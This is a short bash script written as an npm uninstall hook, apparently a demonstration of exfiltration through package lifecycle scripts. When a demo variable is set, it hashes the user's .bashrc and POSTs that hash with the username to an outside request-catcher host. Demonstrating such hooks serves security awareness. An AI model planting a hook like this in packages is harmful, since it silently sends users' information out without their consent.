#! /bin/bash
echo "script: uninstall"

if ! [ -z "$DEMO_EXFILTRATION" ]; then
  # Visit https://npm-test-install-hook.requestcatcher.com/ to see responses
  bashrc_sha=$(cat "$HOME/.bashrc" | openssl dgst -sha256 | sed 's/^.* //')
  curl -X POST "https://npm-test-install-hook.requestcatcher.com/uninstall" \
    -d "user=$USER&bashrc_sha=$bashrc_sha"
fi
